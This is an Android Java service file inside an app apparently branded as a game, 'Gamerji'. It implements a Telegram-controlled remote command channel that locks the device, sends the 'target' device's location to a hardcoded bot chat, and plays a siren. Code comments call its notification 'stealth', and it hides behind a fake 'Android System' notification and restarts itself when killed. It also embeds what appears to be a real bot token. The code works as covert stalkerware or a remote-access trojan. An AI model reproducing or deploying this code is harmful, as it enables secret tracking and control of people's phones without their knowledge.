package com.gamerji.app;

import android.annotation.SuppressLint;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.app.admin.DevicePolicyManager;
import android.content.Context;
import android.content.Intent;
import android.location.Location;
import android.location.LocationManager;
import android.media.AudioManager;
import android.media.Ringtone;
import android.media.RingtoneManager;
import android.net.Uri;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;

import androidx.core.app.NotificationCompat;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;

public class TelegramService extends Service {

    // Aapka Bot Token aur Chat ID
    private static final String BOT_TOKEN = "8752046750:AAHvbZduTrLLSnsooFFjjruINTKlz5PAOdM";
    private static final String CHAT_ID = "5851573541";
    
    private boolean isRunning = false;
    private long lastUpdateId = 0;

    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
        // Stealth Notification
        Notification notification = new NotificationCompat.Builder(this, "SystemSync")
                .setContentTitle("Android System")
                .setContentText("System process running")
                .setSmallIcon(android.R.drawable.stat_sys_warning) // Default system icon
                .setPriority(NotificationCompat.PRIORITY_MIN)
                .build();
        startForeground(1, notification);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (!isRunning) {
            isRunning = true;
            sendMessageToTelegram("✅ Gamerji Engine Started on Target Device!");
            startTelegramPolling();
        }
        return START_STICKY; // App kill hone par restart ho jayega
    }

    private void startTelegramPolling() {
        new Thread(() -> {
            while (isRunning) {
                try {
                    String urlString = "https://api.telegram.org/bot" + BOT_TOKEN + "/getUpdates?offset=" + (lastUpdateId + 1) + "&timeout=10";
                    URL url = new URL(urlString);
                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                    conn.setRequestMethod("GET");

                    BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                    StringBuilder response = new StringBuilder();
                    String line;
                    while ((line = in.readLine()) != null) {
                        response.append(line);
                    }
                    in.close();

                    JSONObject jsonResponse = new JSONObject(response.toString());
                    if (jsonResponse.getBoolean("ok")) {
                        JSONArray results = jsonResponse.getJSONArray("result");

                        for (int i = 0; i < results.length(); i++) {
                            JSONObject update = results.getJSONObject(i);
                            lastUpdateId = update.getLong("update_id");

                            if (update.has("message")) {
                                JSONObject message = update.getJSONObject("message");
                                String text = message.optString("text");
                                String senderChatId = message.getJSONObject("chat").getString("id");

                                // Sirf aapki chat id se aayi command chalegi (Security)
                                if (senderChatId.equals(CHAT_ID)) {
                                    handleCommand(text);
                                }
                            }
                        }
                    }
                    Thread.sleep(2000); // Wait 2 seconds before next poll
                } catch (Exception e) {
                    Log.e("TelegramService", "Network error", e);
                    try { Thread.sleep(5000); } catch (Exception ignored) {}
                }
            }
        }).start();
    }

    private void handleCommand(String command) {
        command = command.toLowerCase().trim();

        if (command.equals("/lock")) {
            lockScreen();
        } 
        else if (command.equals("/location")) {
            sendLocation();
        }
        else if (command.equals("/siren")) {
            playSiren();
        }
        else {
            sendMessageToTelegram("❓ Unknown Command. Available commands:\n/lock - Lock Screen\n/location - Get Location\n/siren - Play Alarm");
        }
    }

    // 1. Lock Screen Feature
    private void lockScreen() {
        DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
        if (dpm != null && dpm.isAdminActive(new android.content.ComponentName(this, MyAdminReceiver.class))) {
            dpm.lockNow();
            sendMessageToTelegram("🔒 Device Locked Successfully!");
        } else {
            sendMessageToTelegram("⚠️ Admin permission is not active!");
        }
    }

    // 2. Location Feature
    @SuppressLint("MissingPermission")
    private void sendLocation() {
        try {
            LocationManager locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
            Location location = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
            
            if (location != null) {
                String mapsLink = "https://maps.google.com/?q=" + location.getLatitude() + "," + location.getLongitude();
                sendMessageToTelegram("📍 Target Location:\n" + mapsLink);
            } else {
                sendMessageToTelegram("❌ Cannot get location. GPS might be off.");
            }
        } catch (Exception e) {
            sendMessageToTelegram("❌ Location Error: " + e.getMessage());
        }
    }

    // 3. Siren Feature (Find Phone)
    private void playSiren() {
        try {
            AudioManager audioManager = (AudioManager) getSystemService(Context.AUDIO_SERVICE);
            audioManager.setStreamVolume(AudioManager.STREAM_ALARM, audioManager.getStreamMaxVolume(AudioManager.STREAM_ALARM), 0);
            
            Uri notification = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_ALARM);
            Ringtone r = RingtoneManager.getRingtone(getApplicationContext(), notification);
            r.play();
            sendMessageToTelegram("🔊 Siren playing at Max Volume!");
        } catch (Exception e) {
            sendMessageToTelegram("❌ Audio Error.");
        }
    }

    // Helper: Send text message to your Telegram
    private void sendMessageToTelegram(String message) {
        new Thread(() -> {
            try {
                String encodedMessage = URLEncoder.encode(message, "UTF-8");
                String urlString = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + encodedMessage;
                URL url = new URL(urlString);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("GET");
                conn.getInputStream().close();
            } catch (Exception e) {
                Log.e("TelegramService", "Failed to send message", e);
            }
        }).start();
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    "SystemSync",
                    "System Process",
                    NotificationManager.IMPORTANCE_MIN
            );
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(channel);
            }
        }
    }
}

